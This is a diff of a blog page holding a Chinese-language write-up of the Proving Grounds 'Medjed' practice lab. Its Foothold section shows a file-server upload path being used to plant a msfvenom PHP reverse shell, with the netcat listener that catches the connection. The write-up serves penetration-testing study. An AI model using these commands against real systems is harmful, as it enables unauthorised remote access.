@@ -170,9 +170,7 @@
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
@@ -214,7 +212,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Yiaos">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content>
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -297,7 +295,7 @@
 <h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><p>继续看下webdav, 访问 <code>https://192.168.111.127:44330/</code>会弹出set administraor account页面，输入admin:password, email随意。然后进入web-file-server</p>
 <p><img src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=MmMzZTkxZTA0MzI5ODQzMGRmYjFlN2Y4MGUyOTZmY2FfbXVnc2VJNTBQbm5yWmNFQVRNck5wc0RWU2xLZ0VlNm5fVG9rZW46Vm5FT2JGc1pObzcxRmV4ZEQxNmNBNWYwbm1lXzE3NDA5MzE5MjQ6MTc0MDkzNTUyNF9WNA"></p>
 <p><img src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZThmNTY1ODg2MmZiYjc0MWVjNGQ0NzE4ZjA4YmY4ZmJfc1BwaVBpNFF5bU1NY254T21HZ1lCdEwxSW43Tmxubm1fVG9rZW46QXZGUWJGQm5Db3Fpb2p4OVJoY2NhcmxjbjdmXzE3NDA5MzE5MjQ6MTc0MDkzNTUyNF9WNA"></p>
-<p>点击fs进入<a target="_blank" rel="noopener" href="https://192.168.111.127:44330/fs/%E7%84%B6%E5%90%8E%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95">https://192.168.111.127:44330/fs/然后发现可以访问任意目录</a>, 然后根据 45332端口的phpinfo中目录信息来到 <a target="_blank" rel="noopener" href="https://192.168.111.127:44330/fs/c/xampp/htdocs/">https://192.168.111.127:44330/fs/c/xampp/htdocs/</a>, <code>msfvenom -p php/reverse_php LHOST=192.168.45.165 LPORT=8000 -f raw -o r.php</code> 生成webshell上传，请求后得到webshell</p>
+<p>点击fs进入<a target="_blank" rel="external nofollow noopener noreferrer" href="https://192.168.111.127:44330/fs/%E7%84%B6%E5%90%8E%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95">https://192.168.111.127:44330/fs/然后发现可以访问任意目录</a>, 然后根据 45332端口的phpinfo中目录信息来到 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://192.168.111.127:44330/fs/c/xampp/htdocs/">https://192.168.111.127:44330/fs/c/xampp/htdocs/</a>, <code>msfvenom -p php/reverse_php LHOST=192.168.45.165 LPORT=8000 -f raw -o r.php</code> 生成webshell上传，请求后得到webshell</p>
 <p><img src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=OWMwNzI1NmU1Y2YxMTAxYmY2N2MwYmI3MGJjYWYyYTdfWEtIRGhwcUhvd0VkV0lmZEVtZUNzUTdXekxFd0VLeWJfVG9rZW46Qlpnb2I2VDN4b21EejZ4OGpOMWM1N1ZEbmM5XzE3NDA5MzE5MjQ6MTc0MDkzNTUyNF9WNA"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">8000</span></span><br><span class="line">listening on [any] <span class="number">8000</span> ...</span><br><span class="line">connect to [<span class="number">192.168</span>.<span class="number">45.165</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span>.<span class="number">111.127</span>] <span class="number">49886</span></span><br><span class="line">whoami</span><br><span class="line">medjed\jerren</span><br></pre></td></tr></table></figure>
 
@@ -323,7 +321,7 @@
     <a href="https://thiiiiink.com/post/20250303001229.html" title="Proving Grounds Practice - Medjed">https://thiiiiink.com/post/20250303001229.html</a>
   </li>
   <li class="post-copyright-license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
   </li>
 </ul>
 </div>
@@ -419,11 +417,11 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
   </div>
   <div class="cc-license motion-element" itemprop="license">
-    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
   </div>
 
 
